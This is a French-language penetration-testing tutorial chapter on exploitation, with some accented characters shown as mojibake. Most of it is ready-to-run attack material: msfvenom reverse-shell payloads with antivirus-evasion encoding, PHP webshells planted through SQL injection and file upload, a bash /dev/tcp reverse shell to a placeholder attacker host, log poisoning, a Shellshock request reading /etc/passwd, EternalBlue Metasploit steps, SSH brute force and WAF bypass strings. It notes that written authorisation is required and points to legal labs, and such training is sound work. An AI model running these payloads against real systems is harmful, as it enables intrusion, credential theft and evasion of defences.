# 02-Exploitation

## ‚öîÔ∏è Vue d'ensemble

L'exploitation est l'√©tape o√π on **transforme les vuln√©rabilit√©s d√©couv√©es en acc√®s r√©el** au syst√®me. C'est passer de "je sais qu'il y a une faille" √† "j'ai un shell sur la machine". C'est le moment crucial o√π la th√©orie devient pratique !

> **üí° Explication Simple** : Si l'√©num√©ration nous dit "la porte a une serrure cass√©e", l'exploitation c'est "tourner la poign√©e et entrer dans la maison". On exploite les faiblesses pour obtenir un acc√®s non autoris√©.

## ‚ö†Ô∏è **IMPORTANT - √Ä propos des exemples**

> **üéØ TOUS les IPs, domaines, commandes dans ce guide sont des EXEMPLES FICTIFS !**

### üìù Exemples vs R√©alit√© :

**Dans le guide (EXEMPLE FICTIF) :**
```
target.com
attacker_ip
192.168.1.100
/var/www/html/shell.php
```

**Dans la vraie vie, vous devez adapter :**
```
votre-vraie-cible.com
10.0.2.15 (votre IP Kali)
172.16.1.50 (vraie IP cible)
/var/www/html/upload/backdoor.php
```

### üîÑ Comment adapter les exemples :
1. **Remplacez** `target.com` par votre vraie cible
2. **Remplacez** `attacker_ip` par votre IP d'attaquant
3. **Remplacez** `4444` par votre port d'√©coute choisi
4. **Remplacez** les chemins par ceux trouv√©s sur la cible
5. **Remplacez** les payloads par ceux adapt√©s √† la cible

## üéØ Objectifs de l'Exploitation

1. **Obtenir un acc√®s initial** - Shell, command execution, file upload
2. **Comprendre les payloads** - Reverse shell, bind shell, meterpreter
3. **Ma√Ætriser Metasploit** - Framework d'exploitation automatis√©
4. **Techniques manuelles** - Exploitation sans frameworks
5. **Bypasser les protections** - AV, WAF, filtres de s√©curit√©

## üóÇÔ∏è Structure et M√©thodes

### Web/
Exploitation des applications web - Le plus commun
- **SQL_Injection.md** - Injection SQL et techniques
- **XSS_Cross_Site_Scripting.md** - Cross-Site Scripting
- **File_Inclusion_LFI_RFI.md** - Local/Remote File Inclusion
- **File_Upload_Vulnerabilities.md** - Upload de fichiers malveillants
- **Command_Injection.md** - Injection de commandes syst√®me
- **CSRF_SSRF.md** - Cross-Site Request Forgery et SSRF

### R√©seaux/
Exploitation des services r√©seau
- **Buffer_Overflow.md** - D√©passement de tampon
- **SMB_Exploitation.md** - EternalBlue, SMB relay
- **SSH_Exploitation.md** - Bruteforce, key reuse
- **RDP_Exploitation.md** - Remote Desktop attacks
- **FTP_Exploitation.md** - FTP bouncing, anonymous access

### Applications/
Exploitation d'applications sp√©cifiques
- **Windows_Applications.md** - Applications Windows
- **Linux_Services.md** - Services Linux vuln√©rables
- **Database_Exploitation.md** - MySQL, PostgreSQL, MSSQL
- **CMS_Exploitation.md** - WordPress, Drupal, Joomla

### Sans_Fichier_Fileless/
Techniques d'exploitation sans fichier sur disque
- **PowerShell_Attacks.md** - Attaques PowerShell
- **WMI_Exploitation.md** - Windows Management Instrumentation
- **Memory_Only_Payloads.md** - Payloads en m√©moire seulement
- **Living_Off_The_Land.md** - Utilisation d'outils syst√®me

### Tools-Reconnaissance/
Guides d√©taill√©s des frameworks et outils
- **Metasploit_Framework.md** - Le framework principal
- **MSFvenom_Payloads.md** - G√©n√©ration de payloads
- **Exploit_Development.md** - D√©veloppement d'exploits
- **Payload_Encoders.md** - Encodage pour bypass AV

## üéØ M√©thodologie d'Exploitation

### Phase 1 : Identification des Vuln√©rabilit√©s
```bash
# Apr√®s √©num√©ration, identifier les vuln√©rabilit√©s exploitables
# Exemple : Apache 2.4.7 ‚Üí CVE-2014-6271 (Shellshock)
searchsploit apache 2.4.7
nmap --script vuln target.com
```

### Phase 2 : Recherche d'Exploits
```bash
# 1. Searchsploit pour exploits locaux
searchsploit "service version"

# 2. Metasploit pour exploits int√©gr√©s
msfconsole
search apache 2.4.7
search type:exploit platform:linux

# 3. GitHub et exploitdb
# Recherche manuelle d'exploits r√©cents
```

### Phase 3 : Pr√©paration du Payload
```bash
# 1. G√©n√©ration avec msfvenom
msfvenom -p linux/x64/shell_reverse_tcp LHOST=attacker_ip LPORT=4444 -f elf > shell.elf

# 2. Listener pour recevoir le shell
nc -nlvp 4444

# 3. Ou avec Metasploit handler
msfconsole
use exploit/multi/handler
set PAYLOAD linux/x64/shell_reverse_tcp
set LHOST attacker_ip
set LPORT 4444
run
```

### Phase 4 : Exploitation
```bash
# Ex√©cution de l'exploit selon la vuln√©rabilit√©
# Exemples selon les cas :

# Web - SQL Injection
sqlmap -u "http://target.com/page.php?id=1" --os-shell

# Network - Buffer Overflow avec Metasploit
use exploit/linux/samba/is_known_pipename
set RHOSTS target.com
set PAYLOAD linux/x64/shell_reverse_tcp
set LHOST attacker_ip
run

# Manuel - Shellshock via curl
curl -H "User-Agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://target.com/cgi-bin/script.cgi
```

## üåê Exploitation Web - Techniques Essentielles

### SQL Injection ‚Üí RCE (Remote Code Execution)
```bash
# 1. D√©tection de SQL injection
sqlmap -u "http://target.com/page.php?id=1" --batch

# 2. Obtenir un shell OS via SQLi
sqlmap -u "http://target.com/page.php?id=1" --os-shell

# 3. Manuel avec UNION injection
# Si on peut √©crire des fichiers :
http://target.com/page.php?id=1' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php' --

# 4. Execution via le webshell upload√©
curl "http://target.com/shell.php?cmd=whoami"
```

### File Upload ‚Üí Shell
```bash
# 1. Upload d'un shell PHP
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# 2. Bypass de filtres d'extension
# Techniques :
# - shell.php.jpg (double extension)
# - shell.phtml, shell.php5, shell.phar
# - shell.php avec Content-Type: image/jpeg

# 3. Utilisation du shell upload√©
curl "http://target.com/uploads/shell.php?cmd=id"

# 4. Upgrade vers reverse shell
curl "http://target.com/uploads/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1'"
```

### Local File Inclusion (LFI) ‚Üí RCE
```bash
# 1. Test LFI basique
curl "http://target.com/page.php?file=../../../etc/passwd"

# 2. Log poisoning pour RCE
# Empoisonner les logs Apache
curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" http://target.com/

# 3. Inclusion du log empoisonn√©
curl "http://target.com/page.php?file=../../../var/log/apache2/access.log&cmd=whoami"

# 4. PHP filter pour RCE (PHP >= 7.0)
curl "http://target.com/page.php?file=php://filter/convert.base64-encode/resource=index.php"
```

## üñ•Ô∏è Exploitation R√©seau avec Metasploit

### SMB - EternalBlue (MS17-010)
```bash
msfconsole

# 1. V√©rifier la vuln√©rabilit√©
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS target.com
run

# 2. Exploiter avec EternalBlue
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target.com
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST attacker_ip
set LPORT 4444
run

# 3. Si succ√®s, on obtient une session meterpreter
# meterpreter > shell
# meterpreter > sysinfo
# meterpreter > getuid
```

### SSH - Brute Force et Exploitation
```bash
# 1. Brute force avec Hydra
hydra -L users.txt -P passwords.txt ssh://target.com

# 2. Avec Metasploit
msfconsole
use auxiliary/scanner/ssh/ssh_login
set RHOSTS target.com
set USERNAME root
set PASS_FILE passwords.txt
run

# 3. Si credentials trouv√©s, connexion SSH
ssh user@target.com

# 4. Exploitation des cl√©s SSH faibles
ssh-keyscan target.com > keys.txt
# Analyser les cl√©s pour faiblesses
```

### Buffer Overflow - M√©thode Manuelle
```bash
# 1. Fuzzing pour crash
#!/usr/bin/python3
import socket
import sys

target = "target.com"
port = 9999

# Cr√©er buffer de plus en plus grand
for i in range(1, 1000):
    buffer = "A" * i
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target, port))
    s.send(buffer.encode())
    s.close()
    print(f"Sent {i} bytes")

# 2. Trouver l'offset exact
# Utiliser pattern unique
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000

# 3. Identifier l'adresse de retour
# Debugger ou analyser le crash

# 4. D√©velopper l'exploit final
# shellcode + padding + return_address
```

## üíæ G√©n√©ration de Payloads avec MSFvenom

### Types de Payloads
```bash
# 1. Reverse Shell (recommand√©)
# La victime se connecte √† nous
msfvenom -p linux/x64/shell_reverse_tcp LHOST=attacker_ip LPORT=4444 -f elf > reverse_shell

# 2. Bind Shell
# On se connecte √† la victime
msfvenom -p linux/x64/shell_bind_tcp LPORT=4444 -f elf > bind_shell

# 3. Meterpreter (plus de fonctionnalit√©s)
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f elf > meterpreter

# 4. Windows Payloads
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe > shell.exe
```

### Formats de Payload
```bash
# Selon le contexte d'exploitation :

# 1. Executable binaire
msfvenom -p linux/x64/shell_reverse_tcp LHOST=attacker_ip LPORT=4444 -f elf

# 2. Shellcode brut (pour buffer overflow)
msfvenom -p linux/x64/shell_reverse_tcp LHOST=attacker_ip LPORT=4444 -f python

# 3. Web shell (PHP, ASP, JSP)
msfvenom -p php/meterpreter_reverse_tcp LHOST=attacker_ip LPORT=4444 -f raw > shell.php

# 4. Script (VBS, PowerShell)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker_ip LPORT=4444 -f vbs > shell.vbs
```

### Encodage pour Bypass AV
```bash
# 1. Encoder pour √©viter la d√©tection
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe -e x86/shikata_ga_nai -i 3 > encoded_shell.exe

# 2. Multiples encodages
msfvenom -p windows/shell_reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe -e x86/shikata_ga_nai -i 5 -x /usr/share/windows-binaries/plink.exe > shell.exe

# 3. Formats moins d√©tect√©s
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker_ip LPORT=4444 -f psh-reflection > shell.ps1
```

## üéØ Listeners et Handlers

### Netcat Listener (Simple)
```bash
# 1. Listener basique
nc -nlvp 4444

# 2. Am√©liorer le shell re√ßu
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z puis :
stty raw -echo; fg

# 3. Listener avec log
nc -nlvp 4444 | tee shell_session.log
```

### Metasploit Handler (Recommand√©)
```bash
msfconsole

# 1. Handler pour reverse shell
use exploit/multi/handler
set PAYLOAD linux/x64/shell_reverse_tcp
set LHOST attacker_ip
set LPORT 4444
run

# 2. Handler pour meterpreter
use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST attacker_ip
set LPORT 4444
run -j  # -j pour background

# 3. Handler persistant
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST attacker_ip
set LPORT 4444
set ExitOnSession false
run -j
```

## üîß Techniques Avanc√©es

### Bypass de Protections
```bash
# 1. Bypass WAF (Web Application Firewall)
# Encodage URL double
curl "http://target.com/page.php?id=1%2527%2520union%2520select%25201"

# Commentaires SQL
curl "http://target.com/page.php?id=1'/**/union/**/select/**/1"

# Case variation
curl "http://target.com/page.php?id=1'UnIoN sElEcT 1"

# 2. Bypass Antivirus
# Templates d'exploits
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe -t /usr/share/windows-binaries/plink.exe > shell.exe

# Cryptage
msfvenom -p windows/shell_reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe --encrypt rc4 --encrypt-key mykey > encrypted_shell.exe
```

### Pivoting et Tunneling
```bash
# 1. Avec Meterpreter
meterpreter > portfwd add -l 3389 -p 3389 -r internal_target_ip

# 2. SSH Tunneling
ssh -L 3389:internal_target_ip:3389 user@compromised_host

# 3. ProxyChains pour tout le trafic
# Configurer /etc/proxychains.conf
proxychains nmap -sT internal_network/24
```

## üìã Checklist d'Exploitation

### ‚úÖ Pr√©paration :
1. **Vuln√©rabilit√© confirm√©e** - Exploit disponible ?
2. **Payload adapt√©** - OS, architecture, restrictions ?
3. **Listener configur√©** - Port ouvert, handler pr√™t ?
4. **Backup plan** - Alternative si √©chec ?
5. **Cleanup plan** - Comment nettoyer apr√®s ?

### ‚úÖ Ex√©cution :
1. **Test en environnement lab** - Jamais direct en prod
2. **V√©rification des permissions** - Autorisation √©crite ?
3. **Documentation** - Screenshots, commandes, r√©sultats
4. **Escalade imm√©diate** - Privilege escalation si n√©cessaire
5. **Persistance** - Maintien d'acc√®s si autoris√©

### ‚úÖ Post-Exploitation :
1. **Reconnaissance syst√®me** - OS, version, utilisateurs
2. **Recherche de credentials** - Mots de passe, cl√©s
3. **Lateral movement** - Autres syst√®mes accessibles ?
4. **Data exfiltration** - Quelles donn√©es sensibles ?
5. **Cleanup** - Suppression des traces

## üéì Tips pour D√©butants

### ü§î Par o√π commencer ?
1. **Applications web** - Plus faciles √† exploiter
2. **Services mal configur√©s** - Mots de passe par d√©faut
3. **Versions obsol√®tes** - Exploits publics disponibles
4. **Permissions faibles** - Upload de fichiers, write access

### üìù Comment pratiquer ?
```bash
# 1. Labs l√©gaux
# DVWA (Damn Vulnerable Web Application)
# Metasploitable 2/3
# VulnHub VMs

# 2. Plateformes d'entra√Ænement
# HackTheBox
# TryHackMe  
# OverTheWire

# 3. Setup local
docker run --rm -it -p 80:80 vulnerables/web-dvwa
```

### ‚ö° Automatisation de Base
```bash
#!/bin/bash
# Script d'exploitation basique

TARGET=$1
LHOST=$2

# 1. Scan de vuln√©rabilit√©s
nmap --script vuln $TARGET > vulns.txt

# 2. Recherche d'exploits
grep -i "VULNERABLE" vulns.txt | while read vuln; do
    echo "Found: $vuln"
    # Rechercher exploit correspondant
done

# 3. Setup listener
echo "Setting up listener on $LHOST:4444"
nc -nlvp 4444 &

echo "Exploitation framework ready"
```

## ‚ö†Ô∏è Consid√©rations Importantes

### üö® S√©curit√© et L√©galit√©
- **Autorisation √©crite** obligatoire avant toute exploitation
- **Environnement isol√©** pour les tests
- **Backup des donn√©es** avant modification
- **Documentation compl√®te** de toutes les actions

### üõ°Ô∏è D√©tection et Evasion
- **IDS/IPS** peuvent d√©tecter les exploits
- **Antivirus** bloque les payloads
- **Logs** enregistrent toutes les tentatives
- **Rate limiting** pour √©viter la d√©tection

---
*Cette section couvre les bases de l'exploitation. Pour des techniques sp√©cifiques, consulter les guides dans chaque sous-section.* 